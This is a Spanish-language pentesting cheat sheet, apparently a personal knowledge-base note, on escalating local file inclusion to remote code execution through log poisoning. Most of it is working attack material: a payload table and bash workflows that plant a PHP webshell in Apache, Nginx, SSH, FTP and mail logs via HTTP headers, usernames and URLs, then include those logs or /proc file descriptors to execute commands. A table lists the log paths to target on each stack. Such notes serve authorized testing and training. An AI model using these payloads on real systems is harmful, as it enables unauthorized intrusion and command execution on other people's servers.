---
aliases:
  - Log Poisoning
tags:
  - type/technique
  - vuln/lfi
  - technique/execution
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
kind: SubCheatSheet
linked:
  - '[[File Inclusion]]'
---
# LFI To RCE - Log Poisoning

***

## Cheatsheet

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -A '<?php system($_GET["cmd"]); ?>' https://target/` luego `?page=/var/log/apache2/access.log&cmd=id` | Apache access log con webshell PHP inyectado | Apache standard. Webserver legible su access.log. |
| `curl -A '<?php system($_GET["cmd"]); ?>' https://target/` luego `?page=/var/log/nginx/access.log&cmd=id` | Nginx access log con webshell | Stack Nginx. |
| `curl -e '<?php system($_GET["cmd"]); ?>' https://target/` (Referer header) luego incluir log | Inyección via Referer en vez de UA | App o WAF que filtra User-Agent. |
| `ssh '<?php system("id"); ?>'@target` (login falla pero queda loggeado) luego `?page=/var/log/auth.log` | SSH auth log con username PHP | Webserver con permisos sobre `/var/log/auth.log`. |
| `curl -X POST -H "Cookie: poison=<?php system('id'); ?>" https://target/` luego incluir log | Cookie injection en log | Cookie reflejada en access log. |
| `curl 'https://target/<?php system("id"); ?>'` (URL con PHP literal) luego `?page=/var/log/apache2/error.log` | URL inválida → log de error con payload | Errores se loggean con request raw. |
| `ftp $TARGET` → login con user `<?php system($_GET["cmd"]); ?>` → `?page=/var/log/vsftpd.log` | FTP log poisoning | App con FTP + LFI alcanza vsftpd.log. |
| Mail con `<?php system("id"); ?>` en From → `?page=/var/log/mail.log` | Mail log poisoning | App con MTA local + LFI. |
| `?page=/proc/self/fd/2` (stderr del web process) | File descriptor del stderr = error log actual | Acceso a logs sin saber path exacto. |
| `?page=/proc/[PID]/fd/X` (iterar PIDs/FDs) | Mismo, file descriptors específicos | Path del log desconocido. |
| `?page=/var/log/auth.log` después de `for i in 1 2 3; do ssh "<?php system('id'); ?>"@target; done` | Confirmar log poisoning con retry | Log rotation o buffering. |
^lfi-logpoisoning

### Workflow Apache

```bash
TARGET="https://target/?page="
INCLUDE="$TARGET/var/log/apache2/access.log&cmd=id"

# 1. Inyectar PHP en access log via User-Agent
curl -s -A '<?php system($_GET["cmd"]); ?>' https://target/

# 2. Incluir log via LFI
curl -s "$INCLUDE"
# Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)

# 3. Si access.log no es legible, probar:
for log in '/var/log/apache2/access.log' '/var/log/apache2/error.log' \
           '/var/log/nginx/access.log' '/var/log/httpd/access_log' \
           '/var/log/auth.log' '/var/log/syslog' '/var/log/mail.log' \
           '/proc/self/fd/0' '/proc/self/fd/1' '/proc/self/fd/2'; do
  echo "=== $log ==="
  curl -s "${TARGET}${log}" | head -5
done
```

### Workflow SSH auth.log

```bash
# 1. Setup PHP en username de SSH (login falla)
ssh -o StrictHostKeyChecking=no '<?php system($_GET["cmd"]); ?>'@target.com 2>&1
# auth.log registra: "Invalid user <?php system... from <IP>"

# 2. Incluir auth.log
curl "https://target/?page=/var/log/auth.log&cmd=id"
```

### Paths de logs por stack

| Stack | Path típico |
|:---:|:---:|
| Apache (Debian) | `/var/log/apache2/access.log`, `error.log` |
| Apache (RHEL) | `/var/log/httpd/access_log`, `error_log` |
| Nginx | `/var/log/nginx/access.log`, `error.log` |
| FTP (vsftpd) | `/var/log/vsftpd.log` |
| FTP (proftpd) | `/var/log/proftpd/proftpd.log` |
| SSH | `/var/log/auth.log` (Debian), `/var/log/secure` (RHEL) |
| Mail | `/var/log/mail.log`, `/var/log/maillog` |
| Sys | `/var/log/syslog`, `/var/log/messages` |
| File descriptors | `/proc/self/fd/0`, `1`, `2` (stdin/stdout/stderr) |

___

## Overview

Log poisoning convierte LFI en RCE inyectando PHP en cualquier file que el webserver pueda incluir. Headers HTTP (User-Agent, Referer, Cookie) terminan en access logs textualmente — si el server incluye ese log, ejecuta el PHP.

**Pre-requisitos:**
1. LFI confirmado con lectura del archivo de log.
2. Webserver user con permisos read sobre el log.
3. Función vulnerable es `include`/`require` (ejecuta), no `file_get_contents` (solo lee).

**Si el log rota o es muy grande**, el PHP puede quedar en una rotación previa o ser fuera de la primera 1MB de read — usar payloads cortos y específicos.

***
